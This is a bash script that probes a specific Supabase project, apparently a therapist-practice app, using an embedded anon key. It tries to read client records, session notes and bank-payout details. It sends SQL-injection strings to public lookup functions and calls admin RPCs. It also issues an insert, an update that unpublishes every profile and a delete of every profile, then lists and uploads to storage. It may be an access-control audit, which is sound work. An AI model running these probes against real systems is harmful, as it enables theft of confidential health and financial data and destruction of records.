K=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJ4Y3VsbmVxcWF6aXV0dWxub2NzIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU1NzUzNjksImV4cCI6MjA5MTE1MTM2OX0.ODJxyrIoJGfL1pfAUX3fMVHVNAXnSN6hVMlL71vFWDc
B=https://rxculneqqaziutulnocs.supabase.co
H=(-H "apikey: $K" -H "Authorization: Bearer $K" -H "Content-Type: application/json")
for t in therapist_public_profiles clients appointments income invoices profiles booking_links user_roles paddle_webhook_events referral_payout_bank_details session_notes client_notes_raw expenses subscriptions; do
  printf "%-32s " "read $t"; curl -s "$B/rest/v1/$t?select=*&limit=1" "${H[@]}" | head -c 90; echo; done
printf "insert profile  "; curl -s -X POST "$B/rest/v1/therapist_public_profiles" "${H[@]}" -d '{"user_id":"00000000-0000-0000-0000-000000000001","is_published":true}' | head -c 120; echo
printf "update profile  "; curl -s -X PATCH "$B/rest/v1/therapist_public_profiles?user_id=neq.00000000-0000-0000-0000-000000000000" "${H[@]}" -H "Prefer: return=representation" -d '{"is_published":false}' | head -c 120; echo
printf "delete profile  "; curl -s -X DELETE "$B/rest/v1/therapist_public_profiles?slug=not.is.null" "${H[@]}" -H "Prefer: return=representation" | head -c 120; echo
for f in ensure_my_therapist_profile_slug:'{"p_base":"x"}' admin_review_license_request:'{}' admin_list_subscriptions:'{}' therapist_profile_allowed:'{"p_user_id":"00000000-0000-0000-0000-000000000001"}' get_my_practice_access:'{}'; do
  printf "%-36s " "rpc ${f%%:*}"; curl -s -X POST "$B/rest/v1/rpc/${f%%:*}" "${H[@]}" -d "${f#*:}" | head -c 90; echo; done
printf "slug sqli       "; curl -s -X POST "$B/rest/v1/rpc/public_get_therapist_profile_by_slug" "${H[@]}" -d "{\"p_slug\":\"x' or '1'='1\"}"; echo
printf "token sqli      "; curl -s -X POST "$B/rest/v1/rpc/public_get_therapist_profile" "${H[@]}" -d "{\"p_token\":\"x' or 1=1--\"}"; echo
printf "storage list    "; curl -s -X POST "$B/storage/v1/object/list/therapist-profile-files" "${H[@]}" -d '{"prefix":"","limit":10}' | head -c 120; echo
printf "storage upload  "; curl -s -X POST "$B/storage/v1/object/therapist-profile-files/00000000-0000-0000-0000-000000000001/x.png" -H "apikey: $K" -H "Authorization: Bearer $K" -H "Content-Type: image/png" --data-binary 'x' | head -c 120; echo
printf "storage public  "; curl -s -o /dev/null -w "%{http_code}" "$B/storage/v1/object/public/therapist-profile-files/x/y.png"; echo
